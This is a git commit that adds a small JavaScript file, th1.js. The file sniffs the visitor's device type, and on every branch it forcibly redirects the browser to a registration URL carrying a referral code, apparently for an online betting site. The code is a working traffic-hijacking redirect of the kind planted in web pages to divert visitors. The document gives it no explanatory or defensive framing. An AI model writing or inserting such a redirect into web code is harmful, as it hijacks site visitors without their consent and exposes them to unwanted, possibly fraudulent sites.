014a824a2b7d4c82ad3d4076e93b892829922b95
gbc-static <127048143+gbc-static@users.noreply.github.com>
2023-03-23 08:11:15 +0800

    Add files via upload

---
+++ th1.js
@@ -0,0 +1,19 @@
+var browser = {
+	versions: function () {
+		var u = navigator.userAgent,
+			app = navigator.appVersion;
+		return {
+			android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1,
+			ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
+			iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1,
+			iPad: u.indexOf('iPad') > -1,
+		};
+	} ()
+};
+if (browser.versions.ios || browser.versions.iPhone || browser.versions.iPad) {
+	window.location.href = "http://tcl8win.com/mobile/register?up=TCLS1";
+	}else if (browser.versions.android) {
+	window.location.href = "http://tcl8win.com/mobile/register?up=TCLS1";
+}else{
+	window.location.href = "http://tcl8win.com/mobile/register?up=TCLS1";
+}
